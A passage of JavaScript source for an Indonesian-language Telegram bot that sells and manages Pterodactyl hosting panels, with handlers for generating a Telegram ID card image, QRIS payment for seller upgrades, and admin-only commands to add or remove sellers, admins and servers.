reply_markup: inlineKeyboard
});
}
await bot.editMessageText(
`<b>✅ Admin Panel Complete</b>\n\n` +
`Username: ${escapeHTML(adminUsername)}\n` +
`Target: ${targetId}\n` +
`✅ Data terkirim ke user`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
} catch (error) {
await bot.editMessageText(
`<b>⚠️ Gagal Mengirim ke Target</b>\n\n` +
`Username: ${escapeHTML(adminUsername)}\n` +
`Email: ${adminEmail}\n` +
`Password: <code>${password}</code>\n` +
`Username: <code>${uniqueUsername}</code>\n\n` +
`Kirim manual ke user!`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
logError('ADMIN_PANEL_SEND_ERROR', `Username: ${adminUsername}, Target: ${targetId}, Error: ${error.message}`);
}
} catch (error) {
console.error('Admin creation error:', error);
logError('ADMIN_PANEL_CREATION_ERROR', `Username: ${adminUsername}, Error: ${error.message}`, userId);
await bot.editMessageText(
`<b>❌ Gagal Membuat Admin</b>\n\n` +
`Error: ${error.message}\n` +
`Hubungi developer!`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🆔 CEK ID COMMAND (DIPERBAIKI)
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/cekid$/, async (msg) => {
notifyOwner('cekid', msg);
const chatId = msg.chat.id;
const user = msg.from;
try {
const fullName = `${user.first_name || ''} ${user.last_name || ''}`.trim();
const username = user.username ? `@${user.username}` : '-';
const userId = user.id.toString();
const today = new Date().toISOString().split('T')[0];
const dcId = (user.id >> 32) % 256;
let backgroundImage;
try {
const bgResponse = await axios.get('https://files.catbox.moe/i1nayt.jpg', { responseType: 'arraybuffer' });
backgroundImage = await loadImage(bgResponse.data);
} catch (bgError) {
console.log('Gagal load background:', bgError.message);
backgroundImage = null;
}
let userAvatar = null;
try {
const photos = await bot.getUserProfilePhotos(user.id, { limit: 1 });
if (photos.total_count > 0) {
const fileId = photos.photos[0][0].file_id;
const file = await bot.getFile(fileId);
const photoUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${file.file_path}`;
const avatarResponse = await axios.get(photoUrl, { responseType: 'arraybuffer' });
userAvatar = await loadImage(avatarResponse.data);
}
} catch (photoError) {
console.log('Gagal ambil foto profil:', photoError.message);
}
let defaultAvatar;
if (!userAvatar) {
try {
const avatarResponse = await axios.get('https://files.catbox.moe/xre5bf.jpg', { responseType: 'arraybuffer' });
defaultAvatar = await loadImage(avatarResponse.data);
} catch (avatarError) {
console.log('Gagal load default avatar:', avatarError.message);
defaultAvatar = null;
}
}
const canvas = createCanvas(800, 450);
const ctx = canvas.getContext('2d');
if (backgroundImage) {
ctx.save();
ctx.filter = 'brightness(0.8) contrast(1.1)';
ctx.drawImage(backgroundImage, 0, 0, canvas.width, canvas.height);
ctx.restore();
ctx.save();
ctx.globalAlpha = 0.4;
ctx.fillStyle = '#000000';
ctx.fillRect(0, 0, canvas.width, canvas.height);
ctx.restore();
} else {
const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
gradient.addColorStop(0, '#1a1a2e');
gradient.addColorStop(1, '#16213e');
ctx.fillStyle = gradient;
ctx.fillRect(0, 0, canvas.width, canvas.height);
}
ctx.save();
ctx.globalAlpha = 0.3;
ctx.fillStyle = '#ffffff';
for (let i = 0; i < 40; i++) {
const x = Math.random() * canvas.width;
const y = Math.random() * canvas.height;
const radius = Math.random() * 2;
ctx.beginPath();
ctx.arc(x, y, radius, 0, Math.PI * 2);
ctx.fill();
}
ctx.restore();
ctx.save();
ctx.globalAlpha = 0.85;
ctx.shadowColor = 'rgba(0, 0, 0, 0.5)';
ctx.shadowBlur = 20;
ctx.shadowOffsetX = 5;
ctx.shadowOffsetY = 5;
ctx.fillStyle = 'rgba(15, 23, 42, 0.75)';
ctx.roundRect(40, 40, canvas.width - 80, canvas.height - 80, 25);
ctx.fill();
ctx.strokeStyle = 'rgba(96, 165, 250, 0.4)';
ctx.lineWidth = 2;
ctx.roundRect(40, 40, canvas.width - 80, canvas.height - 80, 25);
ctx.stroke();
ctx.restore();
ctx.save();
ctx.globalAlpha = 0.8;
const headerGradient = ctx.createLinearGradient(40, 40, canvas.width - 40, 120);
headerGradient.addColorStop(0, 'rgba(30, 41, 59, 0.8)');
headerGradient.addColorStop(1, 'rgba(51, 65, 85, 0.8)');
ctx.fillStyle = headerGradient;
ctx.roundRect(40, 40, canvas.width - 80, 80, [25, 25, 0, 0]);
ctx.fill();
ctx.restore();
ctx.save();
ctx.fillStyle = '#ffffff';
ctx.globalAlpha = 0.9;
ctx.font = 'bold 30px "Segoe UI", Arial, sans-serif';
ctx.textAlign = 'center';
ctx.shadowColor = 'rgba(0, 0, 0, 0.5)';
ctx.shadowBlur = 5;
ctx.fillText('TELEGRAM ID CARD', canvas.width / 2, 85);
ctx.restore();
ctx.save();
ctx.globalAlpha = 0.6;
ctx.strokeStyle = '#60a5fa';
ctx.lineWidth = 2;
ctx.beginPath();
ctx.moveTo(80, 130);
ctx.lineTo(canvas.width - 80, 130);
ctx.stroke();
ctx.restore();
const avatarX = 150;
const avatarY = 240;
const avatarRadius = 70;
ctx.save();
ctx.globalAlpha = 0.5;
ctx.shadowColor = '#60a5fa';
ctx.shadowBlur = 20;
ctx.beginPath();
ctx.arc(avatarX, avatarY, avatarRadius + 5, 0, Math.PI * 2);
ctx.fillStyle = 'transparent';
ctx.fill();
ctx.restore();
if (userAvatar) {
ctx.save();
ctx.beginPath();
ctx.arc(avatarX, avatarY, avatarRadius, 0, Math.PI * 2, true);
ctx.closePath();
ctx.clip();
ctx.globalAlpha = 0.9;
ctx.drawImage(userAvatar, avatarX - avatarRadius, avatarY - avatarRadius, avatarRadius * 2, avatarRadius * 2);
ctx.restore();
ctx.save();
ctx.strokeStyle = 'rgba(96, 165, 250, 0.6)';
ctx.lineWidth = 4;
ctx.globalAlpha = 0.8;
ctx.beginPath();
ctx.arc(avatarX, avatarY, avatarRadius, 0, Math.PI * 2, true);
ctx.stroke();
ctx.restore();
} else if (defaultAvatar) {
ctx.save();
ctx.beginPath();
ctx.arc(avatarX, avatarY, avatarRadius, 0, Math.PI * 2, true);
ctx.closePath();
ctx.clip();
ctx.globalAlpha = 0.9;
ctx.drawImage(defaultAvatar, avatarX - avatarRadius, avatarY - avatarRadius, avatarRadius * 2, avatarRadius * 2);
ctx.restore();
ctx.save();
ctx.strokeStyle = 'rgba(96, 165, 250, 0.6)';
ctx.lineWidth = 4;
ctx.globalAlpha = 0.8;
ctx.beginPath();
ctx.arc(avatarX, avatarY, avatarRadius, 0, Math.PI * 2, true);
ctx.stroke();
ctx.restore();
} else {
ctx.save();
ctx.globalAlpha = 0.8;
ctx.fillStyle = 'rgba(30, 41, 59, 0.9)';
ctx.beginPath();
ctx.arc(avatarX, avatarY, avatarRadius, 0, Math.PI * 2, true);
ctx.fill();
ctx.fillStyle = '#ffffff';
ctx.font = 'bold 50px Arial';
ctx.textAlign = 'center';
ctx.fillText('👤', avatarX, avatarY + 15);
ctx.restore();
}
const infoX = 300;
const infoY = 180;
ctx.save();
ctx.textAlign = 'left';
ctx.fillStyle = '#93c5fd';
ctx.globalAlpha = 0.9;
ctx.font = 'bold 26px "Segoe UI", Arial, sans-serif';
ctx.fillText('USER INFORMATION', infoX, infoY);
ctx.restore();
ctx.save();
ctx.globalAlpha = 0.5;
ctx.strokeStyle = '#60a5fa';
ctx.lineWidth = 2;
ctx.beginPath();
ctx.moveTo(infoX, infoY + 5);
ctx.lineTo(infoX + 300, infoY + 5);
ctx.stroke();
ctx.restore();
const details = [
{ icon: '⎔', label: 'Name', value: fullName },
{ icon: '⎔', label: 'User ID', value: userId },
{ icon: '⎔', label: 'Username', value: username },
{ icon: '⎔', label: 'Date', value: today },
{ icon: '⎔', label: 'DC ID', value: dcId }
];
details.forEach((detail, index) => {
const y = infoY + 50 + (index * 38);
ctx.save();
ctx.globalAlpha = 0.8;
ctx.fillStyle = '#60a5fa';
ctx.font = '18px Arial';
ctx.fillText(detail.icon, infoX, y);
ctx.restore();
ctx.save();
ctx.globalAlpha = 0.9;
ctx.fillStyle = '#dbeafe';
ctx.font = 'bold 18px "Segoe UI", Arial, sans-serif';
ctx.fillText(detail.label + ':', infoX + 30, y);
ctx.restore();
ctx.save();
ctx.globalAlpha = 0.9;
ctx.fillStyle = '#ffffff';
ctx.font = '18px "Segoe UI", Arial, sans-serif';
const value = detail.value || '-';
ctx.fillText(value, infoX + 130, y);
ctx.restore();
});
ctx.save();
ctx.globalAlpha = 0.7;
const footerGradient = ctx.createLinearGradient(40, canvas.height - 50, canvas.width - 40, canvas.height - 30);
footerGradient.addColorStop(0, 'rgba(30, 41, 59, 0.8)');
footerGradient.addColorStop(1, 'rgba(51, 65, 85, 0.8)');
ctx.fillStyle = footerGradient;
ctx.roundRect(40, canvas.height - 50, canvas.width - 80, 30, [0, 0, 25, 25]);
ctx.fill();
ctx.restore();
ctx.save();
ctx.textAlign = 'center';
ctx.fillStyle = '#ffffff';
ctx.globalAlpha = 0.8;
ctx.font = 'italic 16px "Segoe UI", Arial, sans-serif';
const year = new Date().getFullYear();
ctx.fillText(`Generated by ${config.BOT_NAME || 'Novabot'} • ${year}`, canvas.width / 2, canvas.height - 30);
ctx.restore();
ctx.save();
ctx.globalAlpha = 0.1;
ctx.fillStyle = '#ffffff';
for (let i = 0; i < 10; i++) {
const x = Math.random() * canvas.width;
const y = Math.random() * canvas.height;
const radius = Math.random() * 5 + 2;
ctx.beginPath();
ctx.arc(x, y, radius, 0, Math.PI * 2);
ctx.fill();
}
ctx.restore();
const buffer = canvas.toBuffer('image/png');
const caption = `<blockquote>🌀 ${config.BOT_NAME || 'Novabot'} ID Card</blockquote>

👤 <b>Name:</b> ${fullName}
🆔 <b>User ID:</b> <code>${userId}</code>
?? <b>Username:</b> ${username}
📅 <b>Date:</b> ${today}
🏢 <b>DC ID:</b> ${dcId}

<i>Status: ✅ Verified | Active</i>

<code>Generated by ${config.BOT_NAME || 'Novabot'} • ${new Date().getFullYear()}</code>`;
await bot.sendPhoto(chatId, buffer, { 
caption, 
parse_mode: "HTML",
reply_to_message_id: msg.message_id
});
} catch (err) {
console.error('Gagal generate ID card:', err.message);
bot.sendMessage(chatId, '❌ Gagal generate ID card. Silakan coba lagi.');
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📞 OTHER ADMIN COMMANDS
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/delseller(?:\s+(.+))?$/, (msg, match) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = `/delseller ${match[1] || ''}`.trim();
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!isAdmin(userId)) {
return bot.sendMessage(chatId, '<b>❌ Hanya admin yang bisa!</b>', { parse_mode: 'HTML' });
}
if (!match[1]) {
const reseller = loadReseller();
const users = loadUsers();
const resellerIds = Object.keys(reseller);
if (resellerIds.length === 0) {
return bot.sendMessage(chatId,
'<blockquote>📋 Daftar Seller</blockquote>\n\n' +
'<b>Total Seller:</b> 0\n\n' +
'<b>❌ Tidak ada seller terdaftar!</b>',
{ parse_mode: 'HTML' }
);
}
let message = '<blockquote>📋 Daftar Seller</blockquote>\n\n';
message += `<b>Total Seller:</b> ${resellerIds.length}\n\n`;
resellerIds.forEach((id, index) => {
const userData = users[id] || {};
const sellerName = userData.username || 
(userData.first_name ? 
`${userData.first_name}${userData.last_name ? ' ' + userData.last_name : ''}` : 
`ID: ${id}`);
message += `${index + 1}: ${sellerName} (ID: <code>${id}</code>)\n`;
});
message += '\n<blockquote><b>Gunakan:</b> /delseller [id]\n' +
'<b>Contoh:</b> /delseller 123456789</blockquote>';
return bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
}
const targetId = match[1].trim();
removeReseller(targetId);
bot.sendMessage(chatId,
`<blockquote>✅ Seller Removed</blockquote>\n\n` +
`User ID: <code>${targetId}</code>\n` +
`Tidak bisa buat panel gratis lagi.`,
{ parse_mode: 'HTML' }
);
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 💰 SELLER PAYMENT COMMAND - PERBAIKI
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/addseller(?:\s+(.+))?$/, async (msg, match) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const text = match[1];
const messageText = `/addseller ${text || ''}`.trim();
logUserInteraction(userId, username, chatType, messageText, groupName);

if (isAdmin(userId)) {
if (!text) {
return bot.sendMessage(chatId,
"<blockquote>❌ Masukkan ID user!</blockquote>\nContoh: <code>/addseller 123456789</code>",
{ parse_mode: 'HTML' }
);
}
const targetId = text.trim();
addReseller(targetId);
return bot.sendMessage(chatId,
`<blockquote>✅ Seller ditambahkan (Admin)</blockquote>
User ID: <code>${targetId}</code>`,
{ parse_mode: 'HTML' }
);
} else {
if (!text) {
return bot.sendMessage(chatId,
"<blockquote>💰 UPGRADE SELLER PANEL</blockquote>\nMasukkan ID Telegram Anda:\nContoh: <code>/addseller 123456789</code>",
{ parse_mode: 'HTML' }
);
}
const targetId = text.trim();
if (!/^\d+$/.test(targetId)) {
return bot.sendMessage(chatId,
"<blockquote>❌ ID harus angka!</blockquote>\nContoh: <code>/addseller 123456789</code>",
{ parse_mode: 'HTML' }
);
}
if (isReseller(targetId)) {
return bot.sendMessage(chatId,
"<blockquote>⚠️ Sudah menjadi seller</blockquote>",
{ parse_mode: 'HTML' }
);
}
const amount = calculatePrice('seller');
const orderId = `SELLER${Date.now()}${Math.random().toString(36).substr(2, 5)}`.toUpperCase();
const transactions = loadTransactions();
transactions[orderId] = {
userId: userId,
targetId: targetId,
username: username,
panelType: 'seller',
amount: amount,
status: 'pending',
createdAt: new Date().toISOString()
};
saveTransactions(transactions);

const paymentResult = await createQRISPayment(orderId, amount);
if (!paymentResult || !paymentResult.success) {
return bot.sendMessage(chatId,
"<blockquote>❌ Gagal membuat pembayaran</blockquote>",
{ parse_mode: 'HTML' }
);
}

const qrCodeBuffer = await generateQRCode(paymentResult.qris_string || paymentResult.payment_number);
const paymentMessage = await bot.sendPhoto(chatId, qrCodeBuffer, {
caption: `<blockquote>💰 PEMBAYARAN SELLER PANEL</blockquote>
<b>Status :</b> ⏳ MENUNGGU
<b>Paket :</b> SELLER
<b>Harga :</b> Rp ${amount.toLocaleString()}
<b>Order ID :</b> <code>${orderId}</code>
<b>Target ID :</b> <code>${targetId}</code>
<b>Progress :</b> [░░░░░░░░░░] 0%`,
parse_mode: 'HTML',
reply_markup: {
inline_keyboard: [
[
{ text: '⿻ ᴄʜᴀᴛ ᴀᴅᴍɪɴ', url: config.URLADMIN },
{ text: '⛔ Batalkan', callback_data: `cancel_seller_${orderId}` }
]
]
}
});
startPaymentPolling(orderId, chatId, userId, amount, 'seller', username, targetId, paymentMessage.message_id, true);
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🗑️ DELETE ADMIN PANEL
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/deladmin(?:\s+(.+))?$/, async (msg, match) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const text = match[1];
const messageText = `/deladmin ${text || ''}`.trim();
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!isAdmin(userId)) {
return bot.sendMessage(chatId, '<blockquote>❌ Tidak ada admin ditemukan!</blockquote>', { parse_mode: 'HTML' });
}
if (!text) {
try {
const response = await fetch(`${config.DOMAIN}/api/application/users`, {
method: 'GET',
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${config.PLTA}`
}
});
const data = await response.json();
const users = data.data.filter(user => user.attributes.root_admin === true);
if (users.length === 0) {
return bot.sendMessage(chatId, '<blockquote>❌ Tidak ada admin ditemukan!</blockquote>', { parse_mode: 'HTML' });
}
let message = '<blockquote>👑 List Admin Panel</blockquote>\n\n';
users.forEach((user, index) => {
const u = user.attributes;
const safeUsername = u.username.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
message += `${index + 1}. ${safeUsername} (ID: <code>${u.id}</code>)\n`;
});
message += '\n<blockquote>Gunakan:</blockquote> /deladmin [id]\n<b>Contoh:</b> /deladmin 123';
return bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
} catch (error) {
logError('ADMIN_LIST_ERROR', `Error: ${error.message}`, userId);
const safeError = error.message.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
return bot.sendMessage(chatId, `<b>❌ Error:</b> ${safeError}`, { parse_mode: 'HTML' });
}
}
const adminId = text.trim();
const safeAdminId = adminId.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🗑️ Delete Admin</blockquote>\n\n` +
`Menghapus admin...\n` +
`Admin ID: ${safeAdminId}`,
{ parse_mode: 'HTML' }
);
try {
const response = await fetch(`${config.DOMAIN}/api/application/users/${adminId}`, {
method: 'DELETE',
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${config.PLTA}`
}
});
if (!response.ok) throw new Error('Gagal menghapus admin');
await bot.editMessageText(
`<blockquote>✅ Admin Deleted</blockquote>\n\n` +
`Admin ID: <code>${safeAdminId}</code>\n` +
`✅ Berhasil dihapus!`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
} catch (error) {
logError('ADMIN_DELETE_ERROR', `Admin ID: ${adminId}, Error: ${error.message}`, userId);
const safeError = error.message.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
await bot.editMessageText(
`<blockquote>❌ Gagal Menghapus Admin</blockquote>\n\n` +
`Error: ${safeError}`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🗑️ DELETE PANEL SERVER - VERSI SIMPLE & PASTI HAPUS
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/delpanel(?:\s+(.+))?$/, async (msg, match) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const text = match[1];
const messageText = `/delpanel ${text || ''}`.trim();
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!isAdmin(userId)) {
return bot.sendMessage(chatId, '<blockquote>❌ Hanya admin yang bisa!</blockquote>', { parse_mode: 'HTML' });
}
if (!text) {
try {
const response = await fetch(`${config.DOMAIN}/api/application/servers`, {
method: 'GET',
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${config.PLTA}`
}
});
const data = await response.json();
const servers = data.data;
if (servers.length === 0) {
return bot.sendMessage(chatId, '<b>❌ Tidak ada server ditemukan!</b>', { parse_mode: 'HTML' });
}
let message = '<blockquote>📦 List Panel Server</blockquote>\n\n';
servers.forEach((server, index) => {
const s = server.attributes;
const safeName = s.name.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
message += `${index + 1}: ${safeName} (ID: <code>${s.id}</code>)\n`;
});
message += '\n<blockquote><b>Gunakan:</b> /delpanel [id]\n<b>Contoh:</b> /delpanel 123</blockquote>';
return bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
} catch (error) {
logError('SERVER_LIST_ERROR', `Error: ${error.message}`, userId);
const safeError = error.message.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
return bot.sendMessage(chatId, `<b>❌ Error:</b> ${safeError}`, { parse_mode: 'HTML' });
}
}
const serverId = text.trim();
const safeServerId = serverId.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🗑️ Delete Panel</blockquote>\n\n` +
`Menghapus panel...\n` +
`Server ID: ${safeServerId}`,
{ parse_mode: 'HTML' }
);
try {
const emails = loadEmails();
let targetEmail = null;
let targetUserData = null;
let serverIndex = -1;
for (const email in emails) {
const userData = emails[email];
if (userData.servers && Array.isArray(userData.servers)) {
const index = userData.servers.findIndex(server => server.serverId == serverId);
if (index !== -1) {
targetEmail = email;
targetUserData = userData;
serverIndex = index;
break;
}
}
}
if (!targetEmail) {
await bot.editMessageText(
`<blockquote>⚠️ Server Tidak Ditemukan di Database</blockquote>\n\n` +
`Server ID: <code>${safeServerId}</code>\n` +
`Status: Server tidak ditemukan di database email.json\n` +
`Aksi: Mencoba hapus dari Pterodactyl saja...`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
const response = await fetch(`${config.DOMAIN}/api/application/servers/${serverId}`, {
method: 'DELETE',
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${config.PLTA}`
}
});
if (!response.ok) throw new Error('Gagal menghapus server dari Pterodactyl');
await bot.editMessageText(
`<blockquote>✅ Server Deleted</blockquote>\n\n` +
`Server ID: <code>${safeServerId}</code>\n` +
`<b>✅ Berhasil dihapus dari Pterodactyl!</b>\n\n` +
`<i>Catatan: Server tidak ditemukan di database email.json</i>`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
return;
}
const serverName = targetUserData.servers[serverIndex].name;
const panelType = targetUserData.servers[serverIndex].panelType;
const totalServers = targetUserData.servers.length;
await bot.editMessageText(
`<blockquote>🗑️ Delete Panel</blockquote>\n\n` +
`Server ID: <code>${safeServerId}</code>\n` +
`Nama: ${serverName}\n` +
`User: ${targetUserData.username}\n` +
`Email: ${targetEmail}\n` +
`Total Server: ${totalServers} server\n` +
`Status: ${totalServers === 1 ? 'Server terakhir - akan hapus akun' : 'Server tambahan'}`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
const response = await fetch(`${config.DOMAIN}/api/application/servers/${serverId}`, {
method: 'DELETE',
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${config.PLTA}`
}
});
if (!response.ok) throw new Error('Gagal menghapus server dari Pterodactyl');
targetUserData.servers.splice(serverIndex, 1);
if (targetUserData.servers.length === 0 && !targetUserData.isAdminPanel) {
await bot.editMessageText(
`<blockquote>🗑️ Delete Panel</blockquote>\n\n` +
`✅ Server berhasil dihapus dari Pterodactyl\n` +
`🔄 Menghapus akun user dari Pterodactyl...\n` +
`User ID: <code>${targetUserData.pterodactylUserId}</code>`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
const deleteUserResponse = await fetch(`${config.DOMAIN}/api/application/users/${targetUserData.pterodactylUserId}`, {
method: 'DELETE',
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${config.PLTA}`
}
});
if (!deleteUserResponse.ok) {
console.error(`Gagal menghapus user dari Pterodactyl: ${targetUserData.pterodactylUserId}`);
}
delete emails[targetEmail];
await bot.editMessageText(
`<blockquote>✅ Penghapusan Lengkap</blockquote>\n\n` +
`<b>Detail:</b>\n` +
`• Server ID: <code>${safeServerId}</code>\n` +
`• Nama: ${serverName}\n` +
`• User: ${targetUserData.username}\n` +
`• Email: ${targetEmail}\n` +
`• Telegram ID: <code>${targetUserData.telegramId}</code>\n\n` +
`<b>✅ Tindakan:</b>\n` +
`1. Server dihapus dari Pterodactyl\n` +
`2. Akun user dihapus dari Pterodactyl\n` +
`3. Data email dihapus dari database\n\n` +
`<i>Ini adalah server terakhir user.</i>`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
} else {
emails[targetEmail] = targetUserData;
await bot.editMessageText(
`<blockquote>✅ Server Deleted</blockquote>\n\n` +
`<b>Detail:</b>\n` +
`• Server ID: <code>${safeServerId}</code>\n` +
`• Nama: ${serverName}\n` +
`• User: ${targetUserData.username}\n` +
`• Email: ${targetEmail}\n` +
`• Telegram ID: <code>${targetUserData.telegramId}</code>\n\n` +
`<b>✅ Tindakan:</b>\n` +
`1. Server dihapus dari Pterodactyl\n` +
`2. Server dihapus dari database\n` +
`3. Akun user tetap aktif\n` +
`4. Sisa server: ${targetUserData.servers.length} server\n\n` +
`<i>User masih memiliki ${targetUserData.servers.length} server aktif.</i>`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
}
saveEmails(emails);
} catch (error) {
console.error('Error menghapus server:', error);
logError('SERVER_DELETE_ERROR', `Server ID: ${serverId}, Error: ${error.message}`, userId);
const safeError = error.message.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
await bot.editMessageText(
`<blockquote>❌ Gagal Menghapus Panel</blockquote>\n\n` +
`Server ID: <code>${safeServerId}</code>\n` +
`Error: ${safeError}\n\n` +
`Silakan coba lagi atau hubungi developer.`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
}
});

bot.onText(/^\/addadmin (.+)$/, (msg, match) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = `/addadmin ${match[1]}`;
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!isAdmin(userId)) {
return bot.sendMessage(chatId, '<blockquote>❌ Hanya admin yang bisa!</blockquote>', { parse_mode: 'HTML' });
}
const targetId = match[1].trim();
addAdmin(targetId);
bot.sendMessage(chatId,
`<blockquote>✅ Admin Added</blockquote>\n\n` +
`User ID: <code>${targetId}</code>\n` +
`Sekarang memiliki akses admin.`,
{ parse_mode: 'HTML' }
);
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🎉 BOT STARTUP
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
(async () => {
const otakai = initOtakai();
await showBanner();
setTimeout(() => {
checkForUpdatesOnStart();
}, 5000);
setTimeout(() => {
checkAndSendRestartNotification();
}, 3000);
setTimeout(() => {
sendStartupNotification();
}, 7000);
})();